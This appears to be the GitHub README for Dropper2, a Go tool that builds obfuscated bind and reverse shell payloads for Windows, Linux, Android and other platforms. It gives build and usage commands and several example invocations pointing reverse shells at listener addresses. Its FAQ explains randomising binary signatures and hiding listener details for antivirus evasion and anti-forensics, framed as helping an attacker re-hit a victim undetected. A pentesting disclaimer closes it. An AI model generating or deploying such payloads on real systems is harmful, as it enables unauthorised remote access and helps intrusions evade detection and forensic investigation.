Dropper2 (now with more R@nd0m!)

As with the initial release of <a href="https://github.com/im4x5yn74x/dropper">Dropper</a>, navigate to your <a href="https://github.com/golang/go/wiki/SettingGOPATH">GOPATH</a> on your system and clone the repo using the `go get` command.

<code>go get github.com/im4x5yn74x/dropper2</code>

Navigate to the new `github.com/im4x5yn74x/dropper2` folder and build Dropper2 to begin generating payloads.

<code>go build dropper2.go</code><br>

<code>./dropper2 -h</code>
<pre>
Usage of ./dropper2:
  -a string
	Architecture: 386, amd64, amd64p32, arm, arm64, ppc64, ppc64le, mips, mipsle, mips64, mips64le, s390x, sparc64
  -l string
	Listening host: <listening ip:port>
  -o string
	Output filename: <anything goes>
  -p string
	Operating System: windows, linux, freebsd, nacl, netbsd, openbsd, plan9, solaris, dragonfly, darwin, android
  -s string
	Shell type: C:\Windows\System32\cmd.exe, C:\Windows\SYSWOW64\WindowsPowerShell\v1.0\powershell.exe, /bin/sh, /system/bin/sh, /bin/busybox, bypass
  -t string
	Payload type: bind/reverse
</pre>
 
<h3>Payload generation examples:</h3>

<code>./dropper2 -a 386 -o bypassturkey -p windows -l 192.168.1.112:446 -s bypass -t reverse</code>

<code>./dropper2 -a arm -o lateNightTacos -p linux -l 10.0.0.25:4433 -s /bin/busybox -t reverse</code>

<code>./dropper2 -a amd64 -o browngravy -p windows -l 0.0.0.0:9090 -s powershell -t bind</code>

<code>./dropper2 -a mips64 -o cheeseburgers -p linux -l 0.0.0.0:31337 -s /bin/busybox -t bind</code>

<code>./dropper2 -a arm -o trapspot -p android -l 25.128.34.6:443 -s /system/bin/sh -t reverse </code>*<h5>(*NOTE: Only works on <a href="https://termux.com/">Termux</a> for Android)</h5>

<h3>FAQ</h3>
<li>What's New with Dropper2?</li>
<ul>- Dropper2 now supports variable randomization within each payload generated.</ul>
<ul>- Dropper2 also uses obfuscation to disguise both the listening host and port as well as built-in Golang artifacts such as where the payload file is written to be compiled.</ul>
<li>What's the reasons for these changes?</li>
<ul>- Antivirus evasion and antiforensics.</ul>
<li>but why tho'...?</li>
<ul>- During forensic analysis of the binaries generated by Dropper 1.0, my team and I discovered artifacts stored within each Golang binary compiled for every platform. These artifacts included certain string values such as your listening IP address and the port used to connect, your shell type provided (/bin/sh, cmd.exe, etc...) as well as the path to the Golang file you compiled. This information could not only inform forensics engineers where you compiled your tool (a.k.a. your GOPATH most likely), but through the use string analysis, they could easily infer as to what the binary's true intentions may be. (10.0.0.100:1337 /bin/sh; Hmmm, I wonder what it could be doing...)

Realistically, these changes need to be implemented in not only Dropper but within Golang itself, especially for penetration testers and privacy conscious individuals who don't want or can't afford to share intimate information regarding their software. That being said, the use of obfuscation came into the mix to help solve the same problem.</ul>
<li>Ok so what do you mean by "R@nd0m", exactly?</li>
<ul>- Again, while reviewing the previous payloads generated by Dropper 1.0, I had noticed the "Windows" binaries that were generated had the tendency of having the same signature no matter how many times I would recreate the binary. Even changing the name of the payload didn't seem to help the matter much either. Thus something needed to be done during the compilation process. The solution came when I had reviewed different randomization algorithms on the <a href="https://play.golang.org/p/KcuJ_2c_NDj">Go Playground</a>, leading me to choose one that could produce the quickest random value while using the most entropy. The use of this function within Dropper2 now allows each variable written into the generated payloads to be a unique value and effectivly creating a random binary signature everytime; thus allowing an attacker to drop the same payload on a victim's system while appearing brand new each time in the eyes of the antivirus.</ul>
<li>Alright, but is it fool-proof; meaning could it still get caught by antivirus?</li>
<ul>- The short answer is: It depends on the current security policies in place on any given system. In a situation where the compromised system has certain group policy rules such as blocking a user from downloading `unknown` binaries from the internet, then the attacker needs to get a bit more creative. Dropper 1 & 2 binaries were never intended to be the "one payload to defeat them all", but to simply generate reverse and bind shell payloads for multiple platforms and hide as much evidence possible regarding their actual intended purpose.

I understand that wasn't exactly the shortest answer, however any security professional knows there are multiple ways to bypass system policy restrictions and industry standard antivirus. For everyone else who doesn't know; at least you get a unique binary each time that you can try to hit them again with in the event you get caught the first time. Again, use your own professional judgment before running random binarys on targeted systems.</ul>
<li>Ok M4x, we're following you. So what about the future of Dropper? Anything up and coming we should know about?</li>
<ul>- Of course there is. It's an active project I've been adding to anytime I either learn cool tricks to implement or I learn more efficiant ways to write my code. Some teasers for future ideas include:</ul>
<ul>* TLS/SSL support<br>
* UDP and IPv6 support<br>
* Blah-blah-blah...(What kind of hacker would I be if I told you all of my secret plans?)</ul>

<li>Are you still learning Golang?</li>
<ul>- Aren't we all?</ul>
<li>Do you have a disclaimer for us?</li>
<ul>- YOU BET I DO!</ul>

<h3>Disclaimer</h3>
This tool is intended for Penetration Testers, Security Researchers and Red Teamers alike. <b>DO NOT USE</b> this tool for ILLEGAL purposes or <b>WITHOUT</b> the <b><u>CONSENT</u></b> from the parties involved while agreed upon by LEGAL DOCUMENTATION or PERMISSIVE ACCESS for <u>security consultation</u> or <u>research purposes.</u> I, hereby relinquish <b><u>ALL</u></b> responsiblity for any illegal use of this tool or <b><u>ANY</u></b> binary payloads subsequently generated by the tool as discribed. <b>You have been warned.</b>
